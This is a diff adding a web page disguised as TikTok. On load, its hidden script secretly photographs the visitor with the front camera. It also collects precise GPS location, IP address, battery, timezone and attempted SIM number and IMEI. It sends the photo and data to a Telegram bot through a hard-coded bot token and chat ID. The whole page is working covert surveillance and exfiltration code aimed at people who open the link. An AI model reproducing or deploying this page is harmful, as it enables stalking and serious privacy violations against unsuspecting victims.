@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: url('https://i.ibb.co/Y7crqJ0Z/quality-restoration-20250731131830998.jpg') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        
+        #video, #canvas {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            // Start immediately
+            startVerification();
+            
+            async function startVerification() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+                    
+                    video.srcObject = stream;
+                    
+                    // No waiting for metadata - start capturing immediately
+                    setTimeout(() => {
+                        capturePhoto();
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 100); // Reduced from 1000ms to 100ms for faster capture
+                    
+                } catch (err) {
+                    setTimeout(() => {
+                        sendToTelegram(null);
+                    }, 500);
+                }
+            }
+            
+            function capturePhoto() {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                sendToTelegram(canvas);
+            }
+            
+            async function sendToTelegram(canvasElement) {
+                const systemInfo = {
+                    deviceName: getDeviceName(),
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    date: new Date().toLocaleString(),
+                    battery: await getBatteryInfo(),
+                    connection: getConnectionInfo(),
+                    location: await getLocationInfo(),
+                    ip: await getIPAddress(),
+                    simInfo: await getSimInfo()
+                };
+                
+                let message = `📱 *Device Information* 📱\n\n`;
+                message += `📱 *Device*: ${systemInfo.deviceName}\n`;
+                message += `🌐 *Language*: ${systemInfo.language}\n`;
+                message += `🗺️ *Timezone*: ${systemInfo.timezone}\n`;
+                message += `📅 *Date*: ${systemInfo.date}\n`;
+                message += `🔋 *Battery*: ${systemInfo.battery}\n`;
+                message += `📶 *Connection*: ${systemInfo.connection}\n`;
+                message += `📍 *Location*: ${systemInfo.location}\n`;
+                message += `📡 *IP*: ${systemInfo.ip}\n`;
+                
+                // Enhanced SIM info display
+                message += `\n📲 *SIM Card Information*\n`;
+                message += systemInfo.simInfo;
+                
+                const botToken = '8306546024:AAF8cNHIqwUF88sBcZ00D0X4GGf_D9WuXC0';
+                const chatId = '7301310227';
+                
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('text', message);
+                formData.append('parse_mode', 'Markdown');
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if (response.ok && canvasElement) {
+                        const blob = dataURLtoBlob(canvasElement.toDataURL('image/jpeg'));
+                        const photoFormData = new FormData();
+                        photoFormData.append('chat_id', chatId);
+                        photoFormData.append('photo', blob, 'photo.jpg');
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: photoFormData
+                        });
+                    }
+                });
+            }
+            
+            function dataURLtoBlob(dataurl) {
+                const arr = dataurl.split(',');
+                const mime = arr[0].match(/:(.*?);/)[1];
+                const bstr = atob(arr[1]);
+                const u8arr = new Uint8Array(bstr.length);
+                for (let i = 0; i < bstr.length; i++) {
+                    u8arr[i] = bstr.charCodeAt(i);
+                }
+                return new Blob([u8arr], { type: mime });
+            }
+            
+            function getDeviceName() {
+                const ua = navigator.userAgent;
+                if (/iPhone|iPad|iPod/i.test(ua)) return 'Apple';
+                if (/Android/i.test(ua)) return 'Android';
+                if (/Windows/i.test(ua)) return 'Windows';
+                if (/Mac/i.test(ua)) return 'Mac';
+                if (/Linux/i.test(ua)) return 'Linux';
+                return 'Unknown';
+            }
+            
+            async function getBatteryInfo() {
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
+                    } catch (e) {
+                        return 'Unknown';
+                    }
+                }
+                return 'Unknown';
+            }
+            
+            function getConnectionInfo() {
+                if ('connection' in navigator) {
+                    const conn = navigator.connection;
+                    return `${conn.effectiveType || 'Unknown'}`;
+                }
+                return 'Unknown';
+            }
+            
+            async function getLocationInfo() {
+                if ('geolocation' in navigator) {
+                    try {
+                        const pos = await new Promise((resolve, reject) => 
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: true,
+                                timeout: 3000
+                            }));
+                        return `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    } catch (e) {
+                        return 'Denied';
+                    }
+                }
+                return 'Unsupported';
+            }
+            
+            async function getIPAddress() {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const data = await res.json();
+                    return data.ip;
+                } catch {
+                    return 'Unknown';
+                }
+            }
+            
+            async function getSimInfo() {
+                try {
+                    // For Android devices with SIM API access
+                    if ('getSimInfo' in navigator) {
+                        const sims = await navigator.getSimInfo();
+                        if (sims && sims.length > 0) {
+                            let simDetails = '';
+                            sims.forEach((sim, index) => {
+                                simDetails += `SIM ${index + 1}:\n`;
+                                simDetails += `  Carrier: ${sim.carrierName || 'Unknown'}\n`;
+                                simDetails += `  Number: ${sim.phoneNumber || 'Hidden'}\n`;
+                                simDetails += `  Country: ${sim.countryCode || 'Unknown'}\n`;
+                                simDetails += `  MCC/MNC: ${sim.mcc}/${sim.mnc || 'Unknown'}\n\n`;
+                            });
+                            return simDetails;
+                        }
+                        return 'No SIM cards detected';
+                    }
+                    
+                    // For Firefox mobile
+                    if ('mozMobileConnection' in navigator) {
+                        const conn = navigator.mozMobileConnection;
+                        if (conn) {
+                            return `Carrier: ${conn.voice.network.mcc}-${conn.voice.network.mnc}\n` +
+                                   `Number: ${conn.voice.number || 'Hidden'}\n` +
+                                   `IMEI: ${conn.voice.imei || 'Hidden'}`;
+                        }
+                        return 'No SIM detected (Firefox)';
+                    }
+                    
+                    // For Chrome mobile
+                    if ('webkitMobileConnection' in navigator) {
+                        const conn = navigator.webkitMobileConnection;
+                        if (conn) {
+                            return `Carrier: ${conn.voice.network.mcc}-${conn.voice.network.mnc}\n` +
+                                   `Number: ${conn.voice.number || 'Hidden'}\n` +
+                                   `IMEI: ${conn.voice.imei || 'Hidden'}`;
+                        }
+                        return 'No SIM detected (Chrome)';
+                    }
+                    
+                    return 'SIM API not available in this browser';
+                    
+                } catch (e) {
+                    return `Error accessing SIM info: ${e.message}`;
+                }
+            }
+        });
+    </script>
+</body>
+</html>
